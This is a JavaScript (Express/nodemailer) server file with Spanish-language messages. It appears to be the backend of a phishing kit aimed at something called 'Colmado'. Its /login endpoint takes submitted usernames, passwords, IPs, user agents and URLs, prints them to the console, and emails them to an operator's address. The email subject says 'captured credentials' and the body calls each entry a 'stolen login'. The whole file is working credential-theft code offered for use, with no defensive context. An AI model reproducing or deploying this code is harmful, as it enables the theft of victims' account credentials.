const express = require('express');
const nodemailer = require('nodemailer');
const dotenv = require('dotenv');
const cors = require('cors');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// Nodemailer Transporter Setup
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

// Endpoint to receive login data
app.post('/login', async (req, res) => {
    const { username, password, timestamp, userAgent, ip, url } = req.body;

    console.log('--- Nueva Credencial Recibida ---');
    console.log(`Usuario: ${username}`);
    console.log(`Contraseña: ${password}`);
    console.log(`IP: ${ip}`);
    console.log('---------------------------------');

    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_TO,
        subject: '🆕 CREDENCIALES CAPTURADAS - Colmado',
        text: `
        📱 Nuevo login robado:
        
        Usuario: ${username}
        Contraseña: ${password}
        
        ⏰ Fecha/Hora: ${timestamp}
        🌐 IP: ${ip}
        💻 User-Agent: ${userAgent}
        🔗 URL: ${url}
        
        --- Fin del reporte ---
        `
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log('✅ Email enviado con éxito');
        res.status(200).json({ message: 'Datos procesados correctamente' });
    } catch (error) {
        console.error('❌ Error enviando email:', error);
        res.status(500).json({ message: 'Error interno al procesar los datos' });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Servidor backend corriendo en http://localhost:${PORT}`);
});
